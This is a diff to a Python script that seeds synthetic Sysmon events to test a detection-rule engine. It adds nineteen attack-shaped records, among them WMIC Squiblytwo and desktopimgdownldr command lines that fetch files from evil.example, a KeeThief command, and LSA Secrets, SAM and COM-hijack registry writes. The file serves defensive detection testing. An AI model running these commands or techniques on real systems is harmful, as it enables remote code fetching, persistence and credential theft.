@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 173 rules
+job: it is a regression fixture and a coverage demo, built to fire all 192 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25) -- while staying ONE
 incident: everything hangs off a single process-tree root, and no gap between
@@ -131,6 +131,18 @@ machine. The phases, roughly in kill-chain order:
       │   hex-named C2 pipe -- sixteen real shapes pulled from the
       │   "defense evasion misc" and "lateral movement" EVTX-ATTACK-SAMPLES
       │   gap buckets (SYS-205 through SYS-220)
+      ├─ coverage-expansion pass 15: an MSI custom action's temp binary, hh.exe
+      │   proxying a shell through a .chm, msxsl.exe, WMIC Squiblytwo, an
+      │   MSBuild pre-build-event shell, svchost's DcomLaunch group spawning
+      │   cmd.exe, explorer.exe's /root, switch, desktopimgdownldr.exe, a
+      │   TreatAs COM-hijack redirect, a raw SAM RID-500 write, osk.exe
+      │   spawning a process at the logon screen, a fake pending GPO, a
+      │   redirected Startup shell folder, smss.exe spawning a shell,
+      │   mimikatz's memssp log file, a KeeThief remote thread into KeePass,
+      │   a TeamViewer memory-access dump, an LSA Secrets write, and a
+      │   DirectInput keylogger artifact -- nineteen real shapes pulled from
+      │   the "Execution", "Persistence", and "Credential Access"
+      │   EVTX-ATTACK-SAMPLES gap buckets (SYS-221 through SYS-239)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
       ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
@@ -182,7 +194,10 @@ EXPECTED_RULES = {
     "SYS-195", "SYS-196", "SYS-197", "SYS-198", "SYS-199", "SYS-200", "SYS-201",
     "SYS-202", "SYS-203", "SYS-204", "SYS-205", "SYS-206", "SYS-207", "SYS-208",
     "SYS-209", "SYS-210", "SYS-211", "SYS-212", "SYS-213", "SYS-214", "SYS-215",
-    "SYS-216", "SYS-217", "SYS-218", "SYS-219", "SYS-220",
+    "SYS-216", "SYS-217", "SYS-218", "SYS-219", "SYS-220", "SYS-221", "SYS-222",
+    "SYS-223", "SYS-224", "SYS-225", "SYS-226", "SYS-227", "SYS-228", "SYS-229",
+    "SYS-230", "SYS-231", "SYS-232", "SYS-233", "SYS-234", "SYS-235", "SYS-236",
+    "SYS-237", "SYS-238", "SYS-239",
 }
 
 
@@ -388,6 +403,33 @@ G = {
     "downloads_herpaderp": "{rng-downloads-herpaderp}",
     "sharprdp_tool": "{rng-sharprdp-tool}",
     "wmi_hidden_share": "{rng-wmi-hidden-share}",
+    # Coverage-expansion pass 15 (SYS-221..239), field shapes taken from real
+    # EVTX-ATTACK-SAMPLES captures across the "Execution", "Persistence", and
+    # "Credential Access" gap buckets. The registry-only rules (SYS-229,
+    # SYS-230, SYS-232, SYS-233, SYS-238, SYS-239) and the mimikatz-log rule
+    # (SYS-235) reuse existing actors ("lsass", "ops") rather than adding new
+    # ones, since the signature lives entirely in the field values.
+    "msiexec_installer": "{rng-msiexec-installer}",
+    "msi_temp_bin": "{rng-msi-temp-bin}",
+    "hh_help": "{rng-hh-help}",
+    "hh_shell": "{rng-hh-shell}",
+    "msxsl_tool": "{rng-msxsl-tool}",
+    "wmic_squibly": "{rng-wmic-squibly}",
+    "msbuild_proxy": "{rng-msbuild-proxy}",
+    "msbuild_shell": "{rng-msbuild-shell}",
+    "svchost_dcomlaunch": "{rng-svchost-dcomlaunch}",
+    "dcomlaunch_shell": "{rng-dcomlaunch-shell}",
+    "explorer_root": "{rng-explorer-root}",
+    "desktopimgdownldr_dl": "{rng-desktopimgdownldr-dl}",
+    "osk_tool": "{rng-osk-tool}",
+    "osk_child": "{rng-osk-child}",
+    "smss_boot": "{rng-smss-boot}",
+    "smss_shell": "{rng-smss-shell}",
+    "keethief_ps": "{rng-keethief-ps}",
+    "keepass_proc": "{rng-keepass-proc}",
+    "frida_helper": "{rng-frida-helper}",
+    "teamviewer_proc": "{rng-teamviewer-proc}",
+    "keylogger_dx": "{rng-keylogger-dx}",
 }
 
 
@@ -1453,6 +1495,157 @@ def events() -> list[dict]:
                          ParentProcessGuid=G["root"],
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\svc_backup\(Default)",
                          Details="Binary Data"))
+
+    # === Coverage-expansion pass 15: Execution, Persistence, and Credential
+    # Access gaps, field shapes taken from real EVTX-ATTACK-SAMPLES captures
+    # rather than synthesized (SYS-221..239) ===
+    # msiexec runs a custom action that lands a temp binary straight in the
+    # Installer cache (SYS-221).
+    ev.append(proc(step(1), G["msiexec_installer"], G["root"], r"C:\Windows\System32\msiexec.exe",
+                    "C:\\Windows\\system32\\msiexec.exe /V", pid=6100, ppid=628))
+    ev.append(proc(step(1), G["msi_temp_bin"], G["msiexec_installer"], r"C:\Windows\Installer\MSI4FFD.tmp",
+                    '"C:\\Windows\\Installer\\MSI4FFD.tmp"', pid=6110, ppid=6100))
+
+    # hh.exe opens a .chm that embeds a shortcut object, immediately spawning
+    # a shell (SYS-222).
+    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
+                    r'"C:\Windows\hh.exe" C:\Users\redteam.ops\Desktop\Invoice.chm', pid=6120, ppid=4510))
+    ev.append(proc(step(1), G["hh_shell"], G["hh_help"], r"C:\Windows\System32\cmd.exe",
+                    r'"C:\Windows\System32\cmd.exe" /c calc.exe', pid=6130, ppid=6120))
+
+    # msxsl.exe run at all -- not a Windows component, so its presence alone
+    # is the signal (SYS-223).
+    ev.append(proc(step(1), G["msxsl_tool"], G["ops"], r"C:\Users\redteam.ops\Downloads\msxsl.exe",
+                    r"msxsl.exe payload.dat payload.dat", pid=6140, ppid=4510))
+
+    # WMIC formats its output through a remotely-hosted XSL stylesheet --
+    # Squiblytwo (SYS-224).
+    ev.append(proc(step(1), G["wmic_squibly"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
+                    r'wmic process list /format:"https://evil.example/style.xsl"', pid=6150, ppid=4510))
+
+    # MSBuild's pre-build event proxies straight to a shell -- Trusted
+    # Developer Utilities Proxy Execution (SYS-225).
+    ev.append(proc(step(1), G["msbuild_proxy"], G["ops"],
+                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+                    "MSBuild.exe /nologo /nodemode:1 /nodeReuse:true", pid=6160, ppid=4510))
+    ev.append(proc(step(1), G["msbuild_shell"], G["msbuild_proxy"], r"C:\Windows\System32\cmd.exe",
+                    r'"C:\Windows\System32\cmd.exe" /Q /D /C build_event.cmd', pid=6170, ppid=6160))
+
+    # svchost's DcomLaunch service group -- DCOM Server Process Launcher and
+    # Plug and Play, neither of which forks a shell -- spawns cmd.exe (SYS-226).
+    ev.append(proc(step(1), G["svchost_dcomlaunch"], G["root"], r"C:\Windows\System32\svchost.exe",
+                    "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p -s PlugPlay",
+                    pid=6180, ppid=628, user="NT AUTHORITY\\SYSTEM"))
+    ev.append(proc(step(1), G["dcomlaunch_shell"], G["svchost_dcomlaunch"], r"C:\Windows\System32\cmd.exe",
+                    r'"C:\Windows\System32\cmd.exe"', pid=6190, ppid=6180, user="NT AUTHORITY\\SYSTEM",
+                    parent_cmdline="C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p -s PlugPlay"))
+
+    # explorer.exe launched through the undocumented /root, switch, which no
+    # user double-click ever produces (SYS-227).
+    ev.append(proc(step(1), G["explorer_root"], G["ops"], r"C:\Windows\explorer.exe",
+                    r'explorer.exe /root,"C:\Windows\System32\calc.exe"', pid=6200, ppid=4510))
+
+    # desktopimgdownldr.exe fetches an arbitrary remote file through its
+    # /lockscreenurl: switch (SYS-228).
+    ev.append(proc(step(1), G["desktopimgdownldr_dl"], G["ops"], r"C:\Windows\System32\desktopimgdownldr.exe",
+                    r"desktopimgdownldr.exe /lockscreenurl:https://evil.example/payload.7z "
+                    r"/eventName:desktopimgdownldr", pid=6210, ppid=4510))
+
+    # A CLSID's TreatAs value is redirected to another CLSID that already has
+    # a hijacked InprocServer32 -- the second, less-watched COM-hijack lever
+    # alongside SYS-122 (SYS-229).
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", EventType="SetValue",
+                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000_CLASSES\CLSID"
+                                       r"\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs\{Default}"),
+                         Details="{42aedc87-2188-41fd-b9a3-0c966feabec1}"))
+
+    # A raw write straight to the built-in Administrator's RID (500) in the
+    # SAM hive, bypassing lsass's normal account-management APIs (SYS-230).
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
+                         ParentProcessGuid=G["root"], EventType="SetValue",
+                         TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F4\ForcePasswordReset",
+                         Details="Binary Data"))
+
+    # osk.exe, reachable from the logon screen before any credential is
+    # entered, spawns a process -- something the on-screen keyboard never
+    # legitimately does (SYS-231).
+    ev.append(proc(step(1), G["osk_tool"], G["root"], r"C:\Windows\System32\osk.exe",
+                    '"C:\\Windows\\System32\\osk.exe"', pid=6220, ppid=1112, user="NT AUTHORITY\\SYSTEM",
+                    integrity="System", parent_image=r"C:\Windows\System32\Utilman.exe"))
+    ev.append(proc(step(1), G["osk_child"], G["osk_tool"], r"C:\Windows\System32\whoami.exe",
+                    "whoami", pid=6230, ppid=6220, user="NT AUTHORITY\\SYSTEM", integrity="System"))
+
+    # A fake pending Group Policy is queued in the registry so the next
+    # policy refresh runs an attacker-controlled .inf (SYS-232).
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\regedit.exe", EventType="SetValue",
+                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\IEAK"
+                                       r"\GroupPolicy\PendingGPOs\Path1"),
+                         Details=r"c:\programdata\gpo.inf"))
+
+    # The Startup special folder is redirected via User Shell Folders to an
+    # attacker-controlled path (SYS-233).
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", EventType="SetValue",
+                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\Windows"
+                                       r"\CurrentVersion\Explorer\User Shell Folders\startup"),
+                         Details=r"c:\programdata\StartupNewHomeAddress"))
+
+    # smss.exe -- which runs once at boot, launches a fixed set of known
+    # children, and exits -- spawns a shell instead (SYS-234).
+    ev.append(proc(step(1), G["smss_boot"], G["root"], r"C:\Windows\System32\smss.exe",
+                    r"\SystemRoot\System32\smss.exe", pid=6240, ppid=4, user="NT AUTHORITY\\SYSTEM",
+                    integrity="System"))
+    ev.append(proc(step(1), G["smss_shell"], G["smss_boot"], r"C:\Windows\System32\cmd.exe",
+                    r"c:\windows\system32\cmd.exe", pid=6250, ppid=6240, user="NT AUTHORITY\\SYSTEM",
+                    integrity="System"))
+
+    # lsass.exe itself creates mimikatz's memssp default credential-capture
+    # log -- close to a direct signature match (SYS-235).
+    ev.append(raw_event(11, step(1), Image=r"C:\Windows\system32\lsass.exe", ProcessGuid=G["lsass"],
+                         TargetFilename=r"C:\Windows\System32\mimilsa.log"))
+
+    # KeeThief creates a remote thread inside KeePass to read the unlocked
+    # database key straight out of process memory (SYS-236).
+    ev.append(proc(step(1), G["keethief_ps"], G["ops"], r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    "powershell.exe -Command Get-KeePassDatabaseKey", pid=6260, ppid=4510))
+    ev.append(proc(step(1), G["keepass_proc"], G["root"], r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
+                    '"C:\\Program Files\\KeePass Password Safe 2\\KeePass.exe"', pid=6270, ppid=628))
+    ev.append(raw_event(8, step(1), SourceImage=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                         SourceProcessGUID=G["keethief_ps"],
+                         TargetImage=r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
+                         TargetProcessGUID=G["keepass_proc"], User=USER))
+
+    # A process outside TeamViewer's own components opens a handle into its
+    # memory, the same primitive public "TeamViewer dumper" tooling uses
+    # (SYS-237).
+    ev.append(proc(step(1), G["frida_helper"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\frida-winjector-helper-32.exe",
+                    "frida-winjector-helper-32.exe", pid=6280, ppid=4510))
+    ev.append(proc(step(1), G["teamviewer_proc"], G["root"], r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
+                    '"C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe"', pid=6290, ppid=628))
+    ev.append(raw_event(10, step(1),
+                         SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\frida-winjector-helper-32.exe",
+                         SourceProcessGUID=G["frida_helper"],
+                         TargetImage=r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
+                         TargetProcessGUID=G["teamviewer_proc"], GrantedAccess="0x147a", User=USER))
+
+    # A value is written under LSA Secrets -- every DPAPI-protected secret on
+    # the box, including the machine account password (SYS-238).
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\system32\lsass.exe", ProcessGuid=G["lsass"],
+                         EventType="SetValue",
+                         TargetObject=r"HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal\(Default)",
+                         Details="Binary Data"))
+
+    # A DirectX-based keylogger reads raw input through DirectInput rather
+    # than the normal message queue, leaving an artifact under
+    # MostRecentApplication that most anti-keylogging tools never watch
+    # (SYS-239).
+    ev.append(proc(step(1), G["keylogger_dx"], G["ops"], r"C:\Users\redteam.ops\Downloads\keylogger_directx.exe",
+                    "keylogger_directx.exe", pid=6300, ppid=4510))
+    ev.append(raw_event(13, step(1), Image=r"C:\Users\redteam.ops\Downloads\keylogger_directx.exe",
+                         ProcessGuid=G["keylogger_dx"], EventType="SetValue",
+                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\DirectInput"
+                                       r"\MostRecentApplication\Name"),
+                         Details="KEYLOGGER_DIRECTX.EXE"))
 
     return ev
 
